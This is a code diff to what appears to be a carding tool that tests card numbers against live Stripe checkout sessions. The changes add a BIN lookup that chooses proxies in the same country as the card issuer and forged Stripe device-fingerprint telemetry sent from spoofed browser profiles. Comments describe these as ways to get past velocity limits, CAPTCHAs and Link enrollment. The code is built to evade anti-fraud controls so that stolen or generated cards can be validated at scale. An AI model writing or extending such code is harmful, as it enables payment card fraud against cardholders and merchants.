@@ -233,6 +233,38 @@ class ProxyManager:
     async def has_proxies(cls, user_id: int) -> bool:
         return await cls.get_count(user_id) > 0
 
+    _geo_cache: Dict[str, str] = {}
+
+    @classmethod
+    async def get_geo_matched(cls, user_id: int, target_country: str) -> Optional[Dict]:
+        """Select a proxy matching the card's issuing country. Falls back to random."""
+        if not target_country:
+            return await cls.get_random(user_id)
+        target = target_country.upper()
+        pool = await cls.get_user_proxies(user_id)
+        if not pool:
+            return None
+        matches = [p for p in pool if cls._geo_cache.get(p.get('server', ''), '').upper() == target]
+        if matches:
+            return random.choice(matches)
+        uncached = [p for p in pool if p.get('server', '') not in cls._geo_cache]
+        random.shuffle(uncached)
+        for proxy in uncached[:3]:
+            try:
+                auth_str = f"{proxy['username']}:{proxy['password']}@" if proxy.get('username') else ""
+                purl = f"http://{auth_str}{proxy['server'].replace('http://', '')}"
+                async with aiohttp.ClientSession() as sess:
+                    async with sess.get("http://ip-api.com/json/", proxy=purl, timeout=aiohttp.ClientTimeout(total=3)) as resp:
+                        if resp.status == 200:
+                            data = await resp.json()
+                            cc = (data.get('countryCode') or '').upper()
+                            cls._geo_cache[proxy.get('server', '')] = cc
+                            if cc == target:
+                                return proxy
+            except:
+                pass
+        return random.choice(pool)
+
     @classmethod
     def format_for_playwright(cls, proxy_data: Dict) -> Dict:
         playwright_proxy = {"server": proxy_data["server"]}
@@ -332,6 +364,37 @@ class RandomData:
         locale = locales.get(address["country"], "en-US")
         
         return address, timezone_id, locale
+
+# ============= BIN LOOKUP =============
+class BINLookup:
+    """Free BIN database lookup with in-memory caching"""
+    _cache: Dict[str, Dict] = {}
+
+    @classmethod
+    async def lookup(cls, card_number: str) -> Dict:
+        bin6 = card_number[:6]
+        if bin6 in cls._cache:
+            return cls._cache[bin6]
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        result = {
+                            'country': (data.get('countrycode') or '').upper(),
+                            'country_name': data.get('country', ''),
+                            'bank': data.get('bank', ''),
+                            'brand': data.get('brand', ''),
+                            'type': data.get('type', ''),
+                            'level': data.get('level', '')
+                        }
+                        cls._cache[bin6] = result
+                        return result
+        except Exception:
+            pass
+        fallback = {'country': '', 'country_name': '', 'bank': '', 'brand': '', 'type': '', 'level': ''}
+        cls._cache[bin6] = fallback
+        return fallback
 
 # ============= CARD GENERATOR =============
 class CardGenerator:
@@ -603,7 +666,48 @@ class StripeAPIHitter:
         self.proxy_data = proxy_data
         self.raw_amount = raw_amount
         self.locked_email = locked_email
-        
+
+    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict) -> Dict[str, str]:
+        """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
+        import uuid as _uuid
+        fallback = {'muid': str(_uuid.uuid4()), 'sid': str(_uuid.uuid4()), 'guid': str(_uuid.uuid4())}
+        try:
+            tz_map = {'US': -300, 'CA': -300, 'GB': 0, 'AU': -600, 'FR': -60, 'DE': -60, 'JP': -540, 'IN': -330, 'BR': 180, 'SG': -480, 'KR': -540, 'IT': -60, 'ES': -60, 'NL': -60, 'SE': -60, 'MX': 360}
+            tz_offset = tz_map.get(address.get('country', 'US'), -300)
+            payload = {
+                "v": 2,
+                "tag": "4.7.0_js_fp",
+                "src": "js-tokenize-inner-v3",
+                "a": {
+                    "a": self.pk_live,
+                    "b": f"https://checkout.stripe.com/c/pay/{self.cs_live}",
+                    "c": int(profile.get('color_depth', '24')),
+                    "d": f"{profile.get('screen_width', '1920')}x{profile.get('screen_height', '1080')}",
+                    "e": False,
+                    "f": "en-US",
+                    "g": profile.get('os', 'Win32'),
+                    "h": profile['user_agent'],
+                    "i": tz_offset,
+                    "j": False,
+                    "k": 8,
+                    "l": 8,
+                    "m": "",
+                    "n": "",
+                    "o": ""
+                }
+            }
+            loop = asyncio.get_event_loop()
+            tel_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
+                "https://m.stripe.com/6",
+                headers={"content-type": "application/json", "origin": "https://checkout.stripe.com", "referer": "https://checkout.stripe.com/", "user-agent": profile['user_agent']},
+                json=payload, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
+            if tel_res.status_code == 200:
+                t = tel_res.json()
+                return {'muid': t.get('muid') or fallback['muid'], 'sid': t.get('sid') or fallback['sid'], 'guid': t.get('guid') or fallback['guid']}
+        except Exception:
+            pass
+        return fallback
+
     async def fetch_receipt_url(self, intent_id: str, client_secret: str, headers: dict, proxies: dict, profile: dict) -> Optional[str]:
         if not intent_id or not client_secret:
             return None
@@ -643,10 +747,17 @@ class StripeAPIHitter:
         ]
         profile = random.choice(BROWSER_PROFILES)
         
+        # BIN Intelligence — identify card country/bank before hitting
+        bin_info = await BINLookup.lookup(card['card'])
+        bin_country = bin_info.get('country', '')
+        
         max_retries = 3
         for current_attempt in range(max_retries):
             try:
-                proxy_data = self.proxy_data if current_attempt == 0 else await ProxyManager.get_random(user_id)
+                if current_attempt == 0:
+                    proxy_data = self.proxy_data
+                else:
+                    proxy_data = await ProxyManager.get_geo_matched(user_id, bin_country) if bin_country else await ProxyManager.get_random(user_id)
                 proxies = None
                 if proxy_data:
                     result['proxy_raw'] = proxy_data['raw']
@@ -664,29 +775,19 @@ class StripeAPIHitter:
                 }
 
                 address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
+                
+                # Cache proxy geo for future BIN-to-proxy matching
+                if proxy_data and address.get('country'):
+                    ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
+                
+                # Stripe device fingerprint tokens (muid/sid/guid)
+                stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address)
     
                 # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                 import uuid
                 pm_idempotency = str(uuid.uuid4())
                 confirm_idempotency = str(uuid.uuid4())
                 
-                # Step 0: Pure-API Telemetry Harvesting (MUID/SID)
-                # [DISABLED] Sending empty telemetry to m.stripe.com simulates an adblocker,
-                # which causes strict merchants like Foyer Tech to instantly throw an `rqdata` CAPTCHA.
-                # telemetry_url = "https://m.stripe.com/6"
-                # telemetry_headers = {
-                #     "user-agent": profile["user_agent"],
-                #     "content-type": "text/plain;charset=UTF-8",
-                #     "origin": "https://checkout.stripe.com",
-                #     "referer": "https://checkout.stripe.com/"
-                # }
-                # loop = asyncio.get_event_loop()
-                # telemetry_res = await loop.run_in_executor(None, lambda: cffi_requests.post(telemetry_url, headers=telemetry_headers, data="", proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
-                # telemetry_json = telemetry_res.json() if telemetry_res.status_code == 200 else {}
-                # 
-                # muid = telemetry_json.get("muid") or str(uuid.uuid4())
-                # sid = telemetry_json.get("sid") or str(uuid.uuid4())
-    
                 # Step 1: Tokenize the raw card into a PaymentMethod
                 pm_url = "https://api.stripe.com/v1/payment_methods"
                 pm_data = {
@@ -704,9 +805,9 @@ class StripeAPIHitter:
                     "billing_details[address][country]": address["country"],
                     "payment_user_agent": "stripe.js/b60285dd61; stripe-js-v3/b60285dd61; checkout",
                     "pasted_fields": "number",
-                    # "guid": muid,
-                    # "muid": muid,
-                    # "sid": sid,
+                    "guid": stripe_tokens['guid'],
+                    "muid": stripe_tokens['muid'],
+                    "sid": stripe_tokens['sid'],
                     "key": self.pk_live,
                 }
                 # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
@@ -1236,8 +1337,10 @@ class ConcurrentHitter:
                 
             try:
                 max_retries = 2
+                bin_info = await BINLookup.lookup(card['card'])
+                bin_country = bin_info.get('country', '')
                 for try_idx in range(max_retries):
-                    proxy_data = await ProxyManager.get_random(self.user_id)
+                    proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
                     hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data, self.url_info.get('raw_amount'), self.url_info.get('locked_email'))
                     
                     import random
